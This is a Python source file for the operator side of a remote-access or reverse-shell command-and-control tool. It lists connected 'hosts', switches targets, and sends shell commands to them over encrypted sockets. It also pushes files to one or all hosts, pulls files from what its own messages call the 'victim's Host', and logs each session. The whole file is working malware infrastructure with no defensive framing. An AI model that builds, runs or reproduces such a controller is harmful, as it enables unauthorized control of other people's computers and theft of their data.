
import os, sys, time, datetime
from termcolor import cprint
import threading
from socket import timeout
from .server_config import ConnectionSocket
from .file_transfer import send_file, recv_file
from .cipher import encrypt, decrypt
from .TableConsole import Table
from Help.commandErrorsFormat import block_error_format, free_error_format, sendFile_error_format
from Help.help_commands import command_help, get_command_help


class PyCMD(ConnectionSocket):

    def __init__(self,host, port):
        super().__init__(host, port)
        self.__my_socket = self.create_socket()
        assert not isinstance(self.__my_socket, int), exit(1)
        self.__cxn = ""
        self.target = ""
        self.__num_to_encrypt = None
        self.command = ""
        self.output = ""
        self.table = Table()

    def set_target(self, host):
        if host in self.show_hostList:
            self.target = host
            self.__cxn = self.show_hostList[self.target][1]
            self.__num_to_encrypt = self.show_hostList[self.target][3]
            return 0
        else:
            cprint("[-] ERROR: HOST not found!\n", "red")
            return 1

    def waiting(self):
        cprint("\n[+] Waiting for the hosts", "yellow")
        while not self.show_hostList:
            time.sleep(0.1)
            pass
        if sys.platform == "win32":
            os.system("cls")
        else:
            os.system("clear")
        for address in self.show_hostList:
            self.set_target(address)
            self.show_info_target()
            break

    def show_host_table(self):
        self.table.reset()
        self.table.addColumn("ID", 2)
        self.table.addColumn("IP", 20)
        self.table.addColumn("PORT", 10)
        self.table.addColumn("ENCRYPTED", 10)
        self.table.addColumn("ACTIVE", 7)
        for address in self.show_hostList:
            port = str(self.show_hostList[address][0])
            id = str(self.show_hostList[address][5])
            secure = "YES" if self.show_hostList[address][3] > 0 else "NO"
            if self.target == address:  #This line allows us to identify the host that we currently have active
                self.table.addRow((" ".join([id, address, port, secure]) + " <==").split(" "))
            else:
                self.table.addRow((" ".join([id, address, port, secure]) + " ").split(" "))
        self.table.make("host list", "green")
        self.show_blocked_hosts()

    def show_blocked_hosts(self):
        if self.show_blockList:
            self.table.reset()
            self.table.addColumn("ID", 2)
            self.table.addColumn("IP", 20)
            for address in self.show_blockList:
                self.table.addRow([str(address[0]), address[1]])
            self.table.make("block list", "red")
            print()

    def show_info_target(self):
        if sys.platform == "win32":
            os.system("cls")
        else:
            os.system("clear")
        cprint(f"\n[+] Established {self.target} on {self.show_hostList[self.target][0]}\n\tOS {self.show_hostList[self.target][4]}\n", "yellow")

    def prompt(self):
        self.command = input("shell>>> ").strip()
        if self.show_hostList[self.target][4] == "wind32":
            self.command = self.command.lower()

    def send_command(self, command, cxn, cons):
        try:
            command = command.encode()
            if cons > 0:
                command = encrypt(command, cons)
            cxn.send(command)
            return 0
        except Exception:
            self.add_blockList([self.target])
            cprint("[-] ERROR: The host connection was lost. Entered the block list.", "red")
            input("Enter to continue... ")
            self.waiting()
            return 1

    def recv_output(self):
        try:
            self.save_log(f"Command: {self.command}".encode(), True)
            if self.__num_to_encrypt > 0:
                while True:
                    data = b""
                    bufsize = 0
                    while bufsize != 1024:
                        new_data = self.__cxn.recv(256)
                        if not new_data or b"\x04" in new_data:
                            data += new_data
                            break
                        data += new_data
                        bufsize += len(new_data)
                    if b"\x04" in data:
                        data = data.replace(b"\x04", b"")
                        data = decrypt(data, self.__num_to_encrypt)
                        cprint(data.decode("utf-8", "replace"), "green")
                        self.save_log(data, False)
                        break
                    data = decrypt(data, self.__num_to_encrypt)
                    cprint(data.decode("utf-8", "replace"), "green")
                    self.save_log(data, False)
            else:
                while True:
                    data = self.__cxn.recv(1024)
                    if b"\x04" in data:
                        data = data.replace(b"\x04", b"")
                        cprint(data.decode("utf-8", "replace"), "green")
                        self.save_log(data, False)
                        break
                    cprint(data.decode("utf-8", "replace"), "green")
                    self.save_log(data, False)
        except timeout:
            self.add_blockList([self.target])
            cprint("[-] ERROR: The host connection was lost. Entered the block list.", "red")
            input("Enter to continue... ")
            self.waiting()

    def run_command(self):

        if not self.command:  #command null
            pass

        elif self.command[0] == "?":
            if len(self.command) > 1:
                self.command = self.command.replace("?", "")
                cprint(get_command_help(self.command), "red")
            else:
                cprint(command_help, "red")

        elif self.command.lower() in ["cls", "clear"]:
            if sys.platform == "linux":
                os.system("clear")
            else:
                os.system("cls")

        elif self.command[:8] == "savefile":
            name_file = self.command.replace("savefile ", "")
            self.send_command(self.command, self.__cxn, self.__num_to_encrypt)
            success = recv_file(self.__cxn, name_file, self.__num_to_encrypt)
            if success:
                cprint("[+] Save Success\n", "white", "on_green")
            else:
                cprint("[-] ERROR: The requested file is not found on the victim's Host\n", "green", "on_red")

        elif self.command[:8] == "sendfile":
            if self.command[9:12] == "all":
                cxnList = [(data[1], data[2]) for _, data in self.show_hostList.items()]
                self.command = self.command.replace("all ", "")
            elif self.command[9:13] == "list":
                hostList = input("Enter a list of hosts (separated by commas): ")
                #cxnList = [(data[1], data[2]) for host, data in self.show_hostList.items() if host in hostList or str(data[4]) in hostList]
                #self.command = self.command.replace("-l ", "")
            else:
                cxnList = [(self.__cxn, self.__num_to_encrypt)]
            self.command, path_file, name_file = self.command.split(" ")
            if os.path.exists(path_file):
                for cxn, cons in cxnList:
                    self.send_command(self.command, cxn, cons)
                stderr = send_file(cxnList, path_file, name_file)
                if stderr:
                    cprint(stderr, "white", "on_red")
                else:
                    cprint("[+] Send Success!!\n", "white", "on_green")
            else:
                cprint(sendFile_error_format, "white", "on_red")

        elif self.command.lower() == "server":
            cprint(f"The server [{self.show_current_server[0]}] is established on the port {self.show_current_server[1]}\n", "blue")

        elif self.command.lower() == "target":
            cprint(f"Target Current {self.target}:::{self.show_hostList[self.target][0]}\n", "blue")

        elif self.command.lower() == "hosts":
            self.show_host_table()

        elif self.command[:5].lower() == "block":
            self.command = self.command.replace("block ", "").lower()
            if self.command == "all":
                self.block_all()
                self.waiting()
            else:
                if " " in self.command:
                    cprint(block_error_format, "white", "on_red")
                else:
                    host_list = self.set_host_list_format(self.command)
                    self.add_blockList(host_list)
                    if self.target in host_list or self.show_hostList[self.target][4] in host_list:
                        self.waiting()

        elif self.command[:4].lower() == "free":
            self.command = self.command.replace("free ", "").lower()
            if self.command == "all":
                self.free_all()
            else:
                if " " in self.command:
                    cprint(free_error_format, "white", "on_red")
                else:
                    host_list = self.set_host_list_format(self.command)
                    self.remove_blockList(host_list)

        elif self.command[:4].lower() == "bind":
            self.command = self.command.replace("bind ", "")
            if self.command.isdigit():
                for host in self.show_hostList:
                    if int(self.command) == self.show_hostList[host][4]:
                        self.command = host
                        break
            if not self.set_target(self.command):
                self.show_info_target()

        elif self.command.lower() in ["exit", "quit", "disconnect"]:
            self.close_socket(self.__my_socket)
            cprint("\n[-] Disconnected.", "green", "on_red")
            return 1

        else:
            if not self.send_command(self.command, self.__cxn, self.__num_to_encrypt):
                self.recv_output()

    def set_host_list_format(self, host_range):
        if "-" in host_range:
            ran = host_range.split("-")
            host_range = [n for n in range(int(ran[0]), int(ran[1]) + 1)]
        else:
            host_range = host_range.split(",")
            if "." not in host_range[0]:
                host_range = [int(x) for x in host_range]
        return host_range

    def save_log(self, data, info_type):
        with open(f"command_logs/{self.target}.log", "ab") as log:
            if info_type:
                now = datetime.datetime.now()
                form = f"\n[{now.month}/{now.day}/{now.year}][{now.hour}:{now.minute}:{now.second}]".encode()
                form += b"\x0a" + data + b"\x0a"
                log.write(form)
            else:
                log.write(data)

    def run_server(self):
        threading.Thread(target=self.activate_socket, args=(self.__my_socket,), daemon=True).start()
